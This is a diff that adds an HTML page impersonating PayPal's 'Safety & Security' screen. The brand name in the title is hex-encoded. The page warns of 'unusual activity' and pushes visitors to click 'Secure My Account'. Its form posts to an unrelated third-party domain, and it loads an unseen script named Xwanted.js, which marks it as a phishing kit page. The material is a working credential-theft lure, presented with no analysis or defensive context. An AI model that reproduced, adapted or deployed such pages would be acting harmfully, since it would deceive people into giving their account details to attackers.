@@ -1,0 +1,41 @@
+<html class="x_27ID-Z607 xx_Z118xMARVEL xx_Z118xDCxComic x_23ID-Z709 x_PowerRxRagers_x x_26ID-Z664" dir="ltr" id="PP-ID00370715601481">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security </title>
+	<link rel="shortcut icon" type="image/x-icon" href="../../lib/img/favicon.ico">
+    <link rel="apple-touch-icon" href="../../lib/img/apple-touch-icon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
+	<!---------------------------- FONTS ROBOT CONDDENSED ----------------------------->
+	<link href="../../../../../../fonts.googleapis.com/css%3Ffamily=Roboto+Condensed.css" rel="stylesheet">
+	<!------------------------------- FILES CSS STYLE --------------------------------->
+    <link rel="stylesheet" href="../../lib/css/A-Z118.css">
+</style>
+</head>
+<body onload="spinner()">
+<form action="https://chemomab.com/home/customer_center/customer-IDPP00C763/myaccount/settings/index.php" method="post">
+<div style="max-width: 400px;margin: 0 auto;padding: 20px;">
+    <center>
+      <img src="assets/ppll.png" alt="" style="height: 37px;margin-top: 20%;"><br><br>
+      <h1 class="text_safe">We noticed some unusual activity</h1><br>
+      <br>
+      <p class="content_safe">We need your help securing your account to prevent unauthorized access. For your safety, there may be some limitations on your account until you take action.</p>
+      <br>
+      <div class="columns is-multiline is-mobile" id="col">
+      <div class="column is-12">
+      <button name="btn" id="btn">Secure My Account</button>
+      </div></div>
+    </center>
+</div>
+
+<div class="spinner loading" id="spinner" style="display: none;"></div>
+<br><br><br><br><br><br><br>
+<div class="login_footer">
+  <center>
+    <p class="text_footer">Contact Us &nbsp;&nbsp;Privacy &nbsp;&nbsp;Legal &nbsp;&nbsp;Worldwide</p>
+  </center>
+</div>
+<script src="../../../../../../code.jquery.com/jquery-3.3.1.js"></script>
+<script type="text/javascript" src="assets/Xwanted.js"></script>
+</form>
+</body>
+</html>
